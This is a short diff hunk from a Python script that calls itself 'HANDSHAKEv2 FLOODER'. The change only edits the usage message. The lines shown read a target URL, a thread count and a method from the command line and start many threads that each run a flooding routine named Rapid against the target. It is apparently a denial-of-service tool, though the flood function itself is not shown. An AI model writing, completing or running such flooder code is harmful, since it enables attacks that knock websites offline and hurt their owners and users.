@@ -24,6 +24,6 @@ url = '';meth = ''; thread = 0
 if len(sys.argv) == 4:
    url,thread, meth = sys.argv[1], int(sys.argv[2]), sys.argv[3]
 else:
- print(f'WELCOME TO HANDSHAKEv2 FLOODER\n{sys.argv[0]} <URL> <THREAD> <TIME> <METHODS>')
+ print(f'WELCOME TO HANDSHAKEv2 FLOODER\n{sys.argv[0]} <URL> <THREAD> <METHODS>')
 target = get_target(url)
 for _ in range(thread):[threading.Thread(target=Rapid,args=(target,meth)).start() for x in range(10)]
